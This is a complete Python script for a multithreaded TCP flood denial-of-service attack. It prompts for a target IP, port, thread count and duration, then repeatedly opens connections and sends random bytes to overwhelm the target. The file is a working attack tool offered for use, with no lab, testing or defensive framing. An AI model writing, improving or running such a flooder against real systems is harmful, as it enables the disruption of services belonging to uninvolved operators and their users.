import socket
import threading
import random
import time

# Function to generate and send TCP requests
def send_tcp_request(target_ip, target_port, rpc_count):
    try:
        # Create a TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Disable Nagle's algorithm to send packets immediately
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        # Set a timeout for socket operations
        s.settimeout(0.9)
        # Connect to the target IP and port
        s.connect((target_ip, target_port))
        
        # Send random bytes to the target
        for _ in range(rpc_count):
            try:
                s.sendall(random.randbytes(1024))  # Send 1024 random bytes
            except socket.error as e:
                print(f"Send error: {e}")
                break
    except socket.error as e:
        print(f"Connection error: {e}")
    finally:
        s.close()  # Ensure the socket is closed

# Function to run the TCP flood attack using multiple threads
def tcp_flood(target_ip, target_port, thread_count, rpc_count, duration):
    def thread_target(end_time):
        while time.time() < end_time:
            send_tcp_request(target_ip, target_port, rpc_count)
            time.sleep(0.1)  # Short delay before sending the next request

    threads = []
    end_time = time.time() + duration
    
    for _ in range(thread_count):
        thread = threading.Thread(target=thread_target, args=(end_time,))
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    # Keep the main thread alive for the duration of the attack
    try:
        while time.time() < end_time:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping the attack...")

# Main function to get user input and start the attack
def main():
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    thread_count = int(input("Enter the number of threads: "))
    rpc_count = int(input("Enter the number of RPCs per thread: "))
    duration = int(input("Enter the duration of the attack in seconds: "))

    # Start the TCP flood attack
    tcp_flood(target_ip, target_port, thread_count, rpc_count, duration)

if __name__ == "__main__":
    main()
